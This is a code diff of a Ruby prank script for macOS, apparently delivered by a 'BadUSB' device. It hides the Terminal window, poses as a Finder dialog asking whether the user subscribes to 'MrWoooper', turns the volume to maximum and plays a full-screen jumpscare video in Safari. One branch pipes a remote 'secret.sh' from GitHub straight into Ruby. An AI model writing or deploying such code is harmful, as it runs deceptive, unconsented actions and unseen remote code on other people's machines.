@@ -2,10 +2,10 @@
 require 'open-uri'
 require 'tempfile'
 
-# --- Hide Terminal Window ---
+# --- Hide Terminal Immediately ---
 system("osascript -e 'tell application \"Terminal\" to set visible of front window to false'")
 
-# --- Helper Method: Display Dialog with Finder Icon using AppleScript ---
+# --- Helper: Display Dialog with Finder Icon via AppleScript ---
 def display_dialog(message, buttons, default)
   button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
   ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
@@ -17,7 +17,7 @@ def display_dialog(message, buttons, default)
   end
 end
 
-# --- Volume Control ---
+# --- Volume Control: Set Volume to Maximum ---
 def set_volume_to_max
   if system("command -v osascript > /dev/null 2>&1")
     system("osascript -e 'set volume output volume 100'")
@@ -28,74 +28,110 @@ def set_volume_to_max
   end
 end
 
-# --- Branch: Run Secret Script ---
+# --- Create Temporary HTML for a Full-Screen Jumpscare ---
+def create_jumpscare_html(video_url)
+  html_content = <<-HTML
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>JumpScare</title>
+    <style>
+      html, body {
+        margin: 0; padding: 0; height: 100%; background-color: black;
+      }
+      video {
+        width: 100%; height: 100%; object-fit: cover;
+      }
+    </style>
+  </head>
+  <body>
+    <video id="video" autoplay muted playsinline>
+      <source src="#{video_url}" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+    <script>
+      var video = document.getElementById('video');
+      video.play();
+      video.addEventListener('loadeddata', function() {
+        // After a short delay, request fullscreen and unmute, then play.
+        setTimeout(function(){
+          if (video.requestFullscreen) {
+            video.requestFullscreen();
+          } else if (video.webkitRequestFullscreen) {
+            video.webkitRequestFullscreen();
+          } else if (video.msRequestFullscreen) {
+            video.msRequestFullscreen();
+          }
+          video.muted = false;
+          video.play();
+        }, 500);
+      });
+    </script>
+  </body>
+</html>
+  HTML
+  temp = Tempfile.new(['jumpscare', '.html'])
+  temp.write(html_content)
+  temp.close
+  temp.path
+end
+
+# --- Trigger a Jumpscare in Safari ---
+# Opens Safari to display the jumpscare video and manipulates window visibility.
+def trigger_jumpscare(video_url)
+  set_volume_to_max
+  html_file = create_jumpscare_html(video_url)
+  # Open the temporary HTML in Safari.
+  system("open -a Safari '#{html_file}'")
+  # Immediately hide Safari's front window.
+  system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
+  # Wait a moment for the sound to start.
+  sleep 0.5
+  # Unhide Safari so the jumpscare is visible.
+  system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
+  # Let the jumpscare play for 1 second.
+  sleep 1
+end
+
+# --- Run Secret (Rickroll) Script ---
 def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- Branch: Winner Jumpscare ---
-def trigger_winner_jumpscare
-  set_volume_to_max
-  winner_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
-  system("open -a Safari '#{winner_url}'")
-end
-
-# --- Persistent Jumpscare Loop for Non-Subscribers ---
-# This loop uses AppleScript to check if Safari has a tab containing the target URL.
-def persistent_jumpscare(target_url)
-  # Initially open Safari with the target URL.
-  set_volume_to_max
-  system("open -a Safari '#{target_url}'")
-  
-  loop do
-    sleep 3
-    apple_script_check = %Q(
-tell application "Safari"
-  set found to false
-  repeat with w in windows
-    repeat with t in tabs of w
-      if (URL of t) contains "jumpscare2.mp4" then
-        set found to true
-      end if
-    end repeat
-  end repeat
-  if found is false then
-    open location "#{target_url}"
-  end if
-end tell)
-    system("osascript -e '#{apple_script_check}'")
-  end
-end
-
 # --- Main Program Flow ---
 
-# First prompt: "Are you subscribed to MrWoooper?"
-response = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
+# Subscription prompt: "Are you subscribed to MrWoooper?"
+subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
 
-if response.nil?
+if subscribed.nil?
   puts "No response received. Exiting."
   exit 0
 end
 
-if response.downcase == "no"
-  # Non-subscriber branch: immediately play the jumpscare video.
-  # Use the raw link for jumpscare2.mp4.
-  jumpscare_video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
-  persistent_jumpscare(jumpscare_video_url)
+if subscribed.downcase == "no"
+  # Non-subscriber branch: Wait 1 second, then immediately trigger the jumpscare.
+  sleep 1
+  # Using the jumpscare video from your GitHub repo (e.g., Jeff_Jumpscare.mp4).
+  jumpscare_video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
+  trigger_jumpscare(jumpscare_video_url)
+  # Force-kill Terminal.
+  system("killall Terminal")
+  exit 0
 else
-  # Subscriber branch: prompt for button selection.
-  button_message = "Choose a button: (You have a 50% chance of something good happening to you)"
-  button_choice = display_dialog(button_message, ["Button A", "Button B"], "Button A")
-  if button_choice.nil?
+  # Subscriber branch: Show a dialog with two buttons: "Hawk" and "Tuah"
+  button_response = display_dialog("Choose a button: (You have a 50% chance of something good happening to you)", ["Hawk", "Tuah"], "Hawk")
+  if button_response.nil?
     puts "No button chosen. Exiting."
     exit 0
   end
-  # Random outcome 50/50:
-  if rand < 0.5
+
+  if button_response.downcase == "hawk"
     run_secret_script
-  else
-    # Show "You won!" dialog and then trigger winner jumpscare.
-    `osascript -e 'display dialog "You won!" buttons {"OK"} default button "OK" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"'`
-    trigger_winner_jumpscare
+  elsif button_response.downcase == "tuah"
+    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
   end
+  
+  # Force-kill Terminal after action.
+  system("killall Terminal")
+  exit 0
 end
